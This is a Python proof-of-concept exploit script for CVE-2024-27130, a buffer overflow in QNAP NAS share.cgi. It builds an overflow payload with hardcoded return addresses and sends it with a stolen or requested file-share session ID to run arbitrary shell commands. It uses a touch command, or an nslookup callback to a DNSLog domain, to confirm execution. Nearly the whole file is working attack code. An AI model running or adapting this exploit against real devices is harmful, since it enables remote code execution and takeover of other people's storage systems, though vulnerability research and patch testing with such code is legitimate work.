import argparse
import os
import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(prog='PoC', description='PoC for CVE-2024-27130', usage="Obtain an 'ssid' by requesting a NAS user to share a file to you.")
parser.add_argument('host', help='QNAP NAS IP address')
parser.add_argument('ssid', help='File share session ID')
parser.add_argument('--dnslog', help='DNSLog domain for verification (optional)')

def main(args):
    if args.dnslog:
        print("\n[+] Testing vulnerability with DNSLog...")
        
        # 生成唯一的子域名
        random_hash = os.urandom(8).hex()
        dns_test_domain = f"{random_hash}.{args.dnslog}"
        
        # 执行nslookup命令
        cmd = f"/../../../../usr/bin/nslookup {dns_test_domain} || echo DNSLog Test Failed"
        print(f"[+] Sending DNS request to: {dns_test_domain}")
        
        try:
            docmd(args, cmd.encode('ascii'))
        except Exception as e:
            print(f"[-] Command execution failed: {e}")
            return False
        
        print("[+] DNS request sent. Please check your DNSLog for confirmation.")
        print(f"[!] Visit http://www.dnslog.cn to check if {dns_test_domain} appears within 1-2 minutes.")
    else:
        print("\n[!] No DNSLog provided. Executing test command instead...")
        # 这里执行一个简单的测试命令
        test_cmd = "/../../../../usr/bin/touch /tmp/cve_2024_27130_test || echo Command Test Failed"
        docmd(args, test_cmd.encode('ascii'))
        print("[+] Test command executed. Check for /tmp/cve_2024_27130_test on target system.")
    
    return True

def docmd(args, cmd):
    print(f"[*] Executing command: '{cmd.decode()}'")
    
    # 构造缓冲区
    buf = cmd
    buf += b'A' * (4082 - len(buf))
    
    # 添加漏洞利用地址
    buf += (0x54140508).to_bytes(4, 'little')  # delimiter
    buf += (0x54140508).to_bytes(4, 'little')  # r0 and r3
    buf += (0x54140508).to_bytes(4, 'little')  #
    buf += (0x54140508).to_bytes(4, 'little')  # r7
    buf += (0x73af5148).to_bytes(4, 'little')  # pc
    
    payload = {
        'ssid': args.ssid,
        'func': 'get_file_size',
        'total': '1',
        'path': '/',
        'name': buf
    }
    
    # 发送请求
    response = requests.post(
        f"http://{args.host}/cgi-bin/filemanager/share.cgi",
        verify=False,
        data=payload,
        timeout=10
    )
    
    # 检查响应
    if response.status_code == 200:
        print(f"[+] Success! Server responded with status 200")
    else:
        print(f"[-] Unexpected response: {response.status_code}")
    
    return response

if __name__ == "__main__":
    parsedArgs = parser.parse_args()
    
    print(f"[+] Target: {parsedArgs.host}")
    print(f"[+] SSID: {parsedArgs.ssid}")
    
    if parsedArgs.dnslog:
        main(parsedArgs)
        print("\n[+] DNSLog test completed.")
    else:
        # 创建测试文件
        test_cmd = "/../../../../usr/bin/touch /tmp/cve_2024_27130_test"
        docmd(parsedArgs, test_cmd.encode('ascii'))
        print("\n[+] Created test file: /tmp/cve_2024_27130_test")
        
        # 检查命令执行结果
        check_cmd = f"ssh admin@{parsedArgs.host} 'ls -l /tmp/cve_2024_27130_test && echo \"SUCCESS\" || echo \"FAILED\"'"
        print("\n[!] Run this command manually to verify:")
        print(check_cmd)
    
    print("\n[!] Verification completed.")